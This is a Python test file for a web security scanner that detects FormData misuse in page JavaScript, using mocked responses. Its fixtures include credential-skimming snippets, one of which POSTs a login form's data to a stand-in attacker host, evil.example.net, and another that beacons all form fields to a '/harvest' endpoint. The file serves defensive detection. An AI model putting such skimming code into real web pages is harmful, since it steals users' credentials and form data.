"""Tests for FormDataAPISecurityScanner."""
from unittest.mock import MagicMock
from tblue.scanner.form_data_api_security import FormDataAPISecurityScanner


def _scanner():
    s = FormDataAPISecurityScanner.__new__(FormDataAPISecurityScanner)
    s.http = MagicMock()
    return s


def _resp(text, status=200):
    r = MagicMock()
    r.status_code = status
    r.text = text
    r.headers = {}
    return r


def test_form_data_credentials_exfiltrated():
    s = _scanner()
    s.http.get.return_value = _resp(
        "const fd = new FormData()\n"
        "fd.append('password', userInput)\n"
        "sendBeacon('/collect', fd)"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "form_data_credentials_exfiltrated" in types


def test_form_data_sent_to_third_party():
    s = _scanner()
    s.http.get.return_value = _resp(
        "const fd = new FormData(loginForm)\n"
        "fetch('https://evil.example.net/collect', {method:'POST', body: fd})"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "form_data_sent_to_third_party" in types


def test_form_data_all_fields_harvested():
    s = _scanner()
    s.http.get.return_value = _resp(
        "const allData = new FormData(form)\n"
        "sendBeacon('/harvest', allData)"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "form_data_all_fields_harvested" in types


def test_form_data_from_url_param():
    s = _scanner()
    s.http.get.return_value = _resp(
        "const fd = new FormData()\n"
        "fd.append('field', searchParams.get('value'))"
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "form_data_from_url_param" in types


def test_form_data_not_used():
    s = _scanner()
    s.http.get.return_value = _resp("<html>No form submission code</html>")
    results = s.scan("http://example.com")
    assert results[0]["type"] == "form_data_api_not_used"
    assert results[0]["status"] == "PASS"


def test_form_data_null_response():
    s = _scanner()
    s.http.get.return_value = None
    results = s.scan("http://example.com")
    assert results[0]["type"] == "form_data_api_not_used"
